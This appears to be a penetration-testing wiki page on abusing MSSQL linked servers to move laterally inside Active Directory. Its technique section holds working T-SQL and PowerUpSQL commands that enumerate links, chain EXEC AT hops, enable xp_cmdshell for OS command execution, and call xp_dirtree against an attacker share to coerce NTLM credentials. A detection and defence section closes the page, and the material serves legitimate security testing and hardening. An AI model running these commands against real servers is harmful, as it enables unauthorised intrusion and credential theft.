---
title: MSSQL trusted links
slug: mssql-trusted-links
---

> **TL;DR:** Hop between SQL Servers via configured `sp_addlinkedserver` relationships — frequently authenticated as `sa` — for stealthy lateral movement inside AD.

## What it is
A linked server lets one MSSQL instance query another via four-part naming (`SELECT * FROM SRV2.master.sys.databases`). When the link is configured with stored credentials (often `sa`) or with "be made using the login's current security context" plus Kerberos delegation, queries cross instance boundaries with that identity. Operators chain links — A → B → C — until they hit an instance where they're `sysadmin`, then `xp_cmdshell` to OS code as the SQL service account (commonly a domain user, sometimes Domain Admin in older estates).

## Preconditions / where it applies
- A foothold on one MSSQL instance: any login is enough. Public role suffices to enumerate links.
- The instance has one or more linked servers configured with `rpcout = 1` (needed for `EXEC AT`).
- Network reachability between SQL hosts on 1433/tcp (or named instances + SQL Browser 1434/udp).
- Hunting target: `xp_cmdshell` enabled, or `sysadmin` on a downstream link.

## Technique
Enumerate links from the initial foothold:

```sql
-- Tools: mssqlclient.py, PowerUpSQL, impacket-mssqlclient, sqsh
SELECT srvname, isremote, rpc, rpcout FROM master..sysservers;
SELECT name, provider_string, is_linked FROM sys.servers;
-- What am I across the link?
SELECT * FROM OPENQUERY("SRV2", 'SELECT SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')');
```

Chain across (four-part naming works to 1 hop; beyond that use `EXEC AT`):

```sql
EXEC ('EXEC (''SELECT @@version'') AT SRV3') AT SRV2;
```

Once you find a hop where you're `sysadmin`:

```sql
EXEC ('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE;
       EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT SRV3;
EXEC ('xp_cmdshell ''whoami /all''') AT SRV3;
```

PowerUpSQL automates the chain hunt:

```powershell
Get-SQLServerLinkCrawl -Instance SRV1 -Query 'EXEC xp_cmdshell ''whoami'''
```

If a link is `LocalLogin=NULL, RmtUser='sa'`, every login crosses as sa. If it's "current security context" + delegation, you need [[unconstrained-delegation]] or [[constrained-delegation]] mechanics for the cross to succeed.

Privilege escalation primitives once on a target SQL instance:
- `EXECUTE AS LOGIN = 'sa'` if impersonation grants exist.
- Trustworthy databases owned by `sa` — known privesc path.
- `xp_dirtree \\attacker\share` to coerce NetNTLM ([[ntlm]]) for relay.

## Detection and defence
- SQL audit `LINKED_SERVER_*` events; query `sys.servers` regularly and alert on new links.
- Strip `xp_cmdshell`, `Ole Automation Procedures`, `sp_OACreate`, `Ad Hoc Distributed Queries` from non-essential instances.
- Run SQL services as least-priv domain accounts; never as Domain Admin.
- Disable RPC out (`exec sp_serveroption 'SRV2', 'rpc out', 'false'`) on links that don't need it.
- Network: SQL-to-SQL traffic across server zones is unusual — segment it.
- Watch event 33205 (audit) and 18456 (login failures) for hop noise.

## References
- [PowerUpSQL wiki](https://github.com/NetSPI/PowerUpSQL/wiki) — crawl + abuse cookbook
- [NetSPI — SQL Server link crawling](https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-1-sub-rosa/) — chain methodology
- [HackTricks — MSSQL injection / linked servers](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html) — payloads
- [Microsoft docs — sp_addlinkedserver](https://learn.microsoft.com/sql/relational-databases/system-stored-procedures/sp-addlinkedserver-transact-sql) — configuration reference
